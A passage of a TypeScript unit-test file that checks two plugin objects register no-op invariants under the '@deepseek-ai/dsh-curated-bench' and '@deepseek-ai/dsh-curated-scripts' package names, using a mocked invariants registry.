  it('registers the benchmark invariant under the package name', async () => {
    type InstalledInvariant = (ctx: unknown, fail: (message: string) => void) => void
    const disposer = () => {}
    const registered: { install?: InstalledInvariant; packageName?: string } = {}
    const ctx = {
      invariants: {
        register(packageName: string, install: InstalledInvariant) {
          registered.packageName = packageName
          registered.install = install
          return disposer
        },
      },
    }

    await expect(curatedBenchInvariant.apply(ctx as Parameters<typeof curatedBenchInvariant.apply>[0]))
      .resolves.toBe(disposer)
    expect(curatedBenchInvariant.name).toBe('curated-bench-invariant')
    expect(curatedBenchInvariant.inject).toEqual(['invariants'])
    expect(registered.packageName).toBe('@deepseek-ai/dsh-curated-bench')

    const messages: string[] = []
    registered.install?.(ctx, message => messages.push(message))
    expect(messages).toEqual([])
  })
})

describe('curated-scripts invariant companion', () => {
  it('registers its no-op invariant companion under the package name', async () => {
    type InstalledInvariant = (ctx: unknown, fail: (message: string) => void) => void
    const disposer = () => {}
    const registered: { install?: InstalledInvariant; packageName?: string } = {}
    const ctx = {
      invariants: {
        register(packageName: string, install: InstalledInvariant) {
          registered.packageName = packageName
          registered.install = install
          return disposer
        },
      },
    }

    await expect(curatedScriptsInvariant.apply(ctx as Parameters<typeof curatedScriptsInvariant.apply>[0]))
      .resolves.toBe(disposer)
    expect(curatedScriptsInvariant.name).toBe('curated-scripts-invariant')
    expect(curatedScriptsInvariant.inject).toEqual(['invariants'])
    expect(registered.packageName).toBe('@deepseek-ai/dsh-curated-scripts')

    const messages: string[] = []
    registered.install?.(ctx, message => messages.push(message))
    expect(messages).toEqual([])
  })
})
